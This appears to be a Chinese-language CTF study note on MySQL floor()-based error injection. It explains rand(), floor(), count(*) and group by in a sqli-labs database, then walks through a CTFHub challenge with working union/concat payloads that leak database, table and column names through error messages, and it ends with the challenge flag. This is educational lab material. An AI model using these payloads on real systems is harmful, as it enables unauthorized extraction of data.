> 报错注入需要输出`mysql_error()`的报错信息
>

> 参考资料：[https://www.cnblogs.com/xdans/p/5412468.html](https://www.cnblogs.com/xdans/p/5412468.html)
>

# 前置知识
## rand()
rand函数在许多语言中都有出现过，在mysql中的作用是生成随机数，可以来看一下：`select rand();`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642215486965-065d8603-0b3b-46c0-8bf3-8a474085e85e.png)

可以看到我们执行了三次rand()语句返回的结果均不相同，均是随机数：`0.07456140972167385`、`0.39705777764046357`、`0.7616046897709413`。

当然了和C语言中的rand函数相同，mysql的rand函数也可以指定一个随机数种子的参数，类似于：`rand(seed)`，下面是当seed为1时的情况：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642215805652-0a488490-0b26-4691-83b1-8db1adaa6dc9.png)

当我们指定了rand的seed后生成的随机数值不变，所以rand可以被称为`伪随机数生成器`，生成的随机数和指定的随机数种子有关。下面是我`sqli-labs`中`security`数据库的`users`表：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642216031877-19ed038c-7fdd-457a-b9d0-b73b48a732d6.png)

可以在终端中切换到此数据库：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642216228429-b55ecbf5-2835-4cc4-af5a-6ae6f8ae6163.png)

users表中有13条数据，所以执行`select rand() from users;`也会出现13条数据：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642216514276-a93d1e2a-9471-486f-93f5-0d4493d4fd66.png)

我们指定seed为一个固定值，比如0：`select rand(0) from users;`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642216539912-a72972eb-c1ec-4171-86f7-15ed0390072c.png)

**当指定seed后生成的结果不会再发生变化**。

## floor()
`floor()`函数返回小于等于该值的最大整数，也就是将小数点后的数字全部擦除，比如：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642216814543-cff8f559-bb6b-470c-b033-a2afb7e612a7.png)

rand函数只会生成0到1之间的随机数，如果我们对它的结果乘2呢？`select rand(0)*2 from users;`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642216977473-998aeed5-a06d-429e-afde-4031efcd1b88.png)

对rand的结果乘2后会出现大于1的数字，此时使用floor进行取整，可以知道结果一定只会出现0和1：`select floor(rand(0)*2) from users;`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642217153134-e8694ae1-8901-4603-8fd1-0d5c37005c90.png)

## count(*)
`count(*)`在mysql语句中用来进行计数，这里使用菜鸟教程中的数据进行举例：[超链接](https://www.runoob.com/mysql/mysql-group-by-statement.html)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642221736554-02c0a8dd-4dc9-4ae6-9f5b-9900a21af1fc.png)

将数据导入我们的数据库：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642221936168-ece260d8-1bfe-477e-aa85-82e7f81730bd.png)

执行语句`select signin from employyee_tbl; `

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642222064999-6bc503e3-17bf-4664-baad-cd80775696fb.png)

我们可以使用`count(*)`子句对`signin`数据进行整合：`select signin,count(*) from employee_tbl group by signin;`

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642222201121-233dfd96-e349-4f5a-a4d2-990134377bcd.png)

> group by语句是依据（by）...条件进行聚合（group by）
>

可以看到当`group by`和`count(*)`语句一起使用时会计算出signin出现的次数。为了方便这里可以将上述语句进行抽象：`select key,count(*) from employee_tbl group by key;`。

当mysql遇到group by语句时会先判断虚拟表是否存在，如果不存在则会创建一个新的虚拟表：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642228394976-4286d59a-f07e-4529-8c72-c70c8e7d5806.png)

key的值不能重复，如果有相同的则会合并到一起。然后开始执行查询语句，看该表中的第一个数据：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642228808457-4784391b-4b89-4280-b3eb-ccb029aec7aa.png)

因为语句中只有signin，所以只看它即可，第一个值为1，向表中填写：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642228892111-33d43528-8f9b-4c68-b5e4-e01a11e649db.png)

count(*)起到统计出现次数的作用，因为到目前为止key值出现了一次1，所以向表中填写：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642229051534-e589cff1-2b5b-4b40-a64e-1cf0ca520632.png)

当signin等于3、2、4时同理：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642229173487-bd9ae081-42b1-4a42-b40c-44d409010e35.png)

下面key也就是signin又为4：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642229277275-4bc35c86-9ed2-4cdd-8205-72fd619b6281.png)

因为key不能重复，所以不会再添加一行内容，但是会对对应的count(*)加1：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642229674399-30e2ca1b-bb3a-4558-a260-d915f9c6c4a0.png)

所以最终的结果如下：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642229653835-dc37d054-3287-4b3a-a139-f2f276d1c35f.png)

也就是：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642229709447-38a57d5d-1dee-4b23-9011-9e8e8979341a.png)

# floor报错注入
有了上面的基础知识后我们来看floor报错注入。当前所处的数据库为sqli-labs的security数据库：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642230048308-8aa04007-fa0c-45eb-90f0-cde461f7d515.png)

来看一个语句：`select count(*) from users group by floor(rand(0)*2);`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642230171166-b15b120b-8d4d-4f68-be08-9b0dd339e5a7.png)

需要仔细研究一下这里发生的错误，可以将上述语句抽象为：`select count(*) from users group by key;`，其中`key`为`floor(rand(0)*2)`。按照之前所说的当前虚拟表不存在会进行新建：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642230549262-9622ccda-c993-4a5e-be82-97ca9b422536.png)

先依次列出key的值：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642230651535-4854efb3-fd4c-4ace-a67c-93c208d418e9.png)

> `key = 0、1、1、0、1、1、0、0、1、1、1、0、1`（key的值在查询每条数据时由执行的`floor(rand(0)*2)`产生的，这里为了方便一下子列了出来）。
>
> 下面尤其需要注意一下：**<font style="color:#E8323C;">查询表中的记录、查询虚拟表、</font>**`**<font style="color:#E8323C;">floor(rand(0)*2)</font>**`**<font style="color:#E8323C;">的执行、插入新分组这四者之间的顺序。</font>**
>
> 1. **<font style="color:#E8323C;">得到数据库中数据（不重要）</font>**
> 2. **<font style="color:#E8323C;">执行</font>**`**<font style="color:#E8323C;">floor(rand(0)*2)</font>**`**<font style="color:#E8323C;">得到key</font>**
> 3. **<font style="color:#E8323C;">查询虚拟表是否出现有此key</font>**
>     1. **<font style="color:#E8323C;">未出现</font>**
>         1. **<font style="color:#E8323C;">由于rand函数的缘故导致会重新执行</font>**`**<font style="color:#E8323C;">floor(rand(0)*2)</font>**`**<font style="color:#E8323C;">得到key并插入（无论虚拟表中有没有该分组）</font>**
>     2. **<font style="color:#E8323C;">出现</font>**
>         1. **<font style="color:#E8323C;">递增该key分组的count</font>**
> 4. **<font style="color:#E8323C;">重新执行第1条指令直到数据库中数据已经获取完。</font>**
>

现在执行第一次查询，`floor(rand(0)*2)`产生的值为0【第一次计算】，现在虚拟表中并没有出现过key为1的分组于是需要插入，但是由于rand函数本身的特殊性，导致`floor(rand(0)*2)`又重新产生了一个值也就是1【第二次计算】，现在会将最后生成的值1分组插入到虚拟表中：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642231067835-23ba640b-91ab-4b58-819a-8018d23eec20.png)

开始查询第二条记录，也就是：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642231595774-b0aedacc-8b80-4571-84b4-199e47a00789.png)

执行`floor(rand(0)*2)`，返回key为1【第三次计算】，发现1的值存在于虚拟表中，所以会继续计数而不会再次执行`floor(rand(0)*2)`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642231852355-d4ef1217-bc99-4bf8-82db-96a06862265f.png)

继续查询第三条内容：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642232710749-c6ab31e3-3172-4998-9275-920fbffcd0da.png)

**再次计算**`**floor(rand(0)*2)**`**，返回0【第4次计算】，但是虚拟表中没有该key，于是又需要插入新分组，然后**`**floor(rand(0)*2)**`**又被触发【第5次计算】返回1进行插入，但是现在key为1虚拟表中已经拥有，插入时会发生报错：**

```c
mysql> select count(*) from users group by floor(rand(0)*2);
ERROR 1062 (23000): Duplicate entry '1' for key '<group_key>'
mysql>
```

> **发生根本错误的原因是rand的重新执行，总之报错需要count(*)，rand()、group by这三者同时存在，缺一不可。**
>

# 实战
这里使用CTFHUB的报错注入进行说明。输入`1'`之后报错：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642237909498-988ff789-4850-43e8-b5d7-d79ed4c6e6a9.png)

`select * from news where id=1'`，由于这里查询语句已经知道，查询的内容为news表中的数据，显然里面没有我们要找flag，所以现在直接查询当前的数据库：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642238550778-70c8a714-a5aa-4b0d-8c96-d4c435f6f1dc.png)

`?id=1 union select count(*) ,concat(database(),0x26,floor(rand(0)*2)) as x from information_schema.columns group by x;`

这里的concat会将database和报错一起带出，所以很轻松知道当前的数据库名称为sqli，然后查询数据库中的表：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642238889774-d3e6503b-f3e2-4f90-a089-6eed0a2096af.png)

`?id=1 union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x26,floor(rand(0)*2)) as x from information_schema.columns group by x`，和之前相同这里使用了`information_schema`的特性找到当前数据库sqli下有一个flag表。

然后查列名，名字也是flag：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642239111317-2f9830fa-b7a9-4a48-a500-44b472121e53.png)

`?id=1 union select count(*),concat((select column_name from information_schema.columns where table_schema='sqli' and table_name='flag' limit 0,1),0x26,floor(rand(0)*2)) as x from information_schema.columns group by x`。

最后得到flag即可：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1642239175961-b271c03e-fd7f-4a9a-9ddb-4957aa6e2bd7.png)

`ctfhub{657a71f4322a081e4c6dad05}`。















